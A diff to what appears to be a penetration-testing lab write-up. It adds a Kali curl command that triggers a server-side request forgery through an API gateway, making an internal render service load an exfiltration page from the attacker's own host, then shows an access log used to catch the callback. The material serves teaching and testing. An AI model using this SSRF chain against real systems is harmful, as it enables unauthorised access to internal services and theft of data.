@@ -659,7 +659,15 @@ function exfiltrate() {
 </body>
 </html>
 ```
-After triggering the SSRF, we got the response to our kali machine
+After triggering the SSRF 
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.203/exfil.html"}' http://apigateway:8000/files/import
+{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+```
+We got the response to our kali machine
 ```log
 ┌──(kali㉿kali)-[/var/www/html]
 └─$ tail -f /var/log/apache2/access.log           
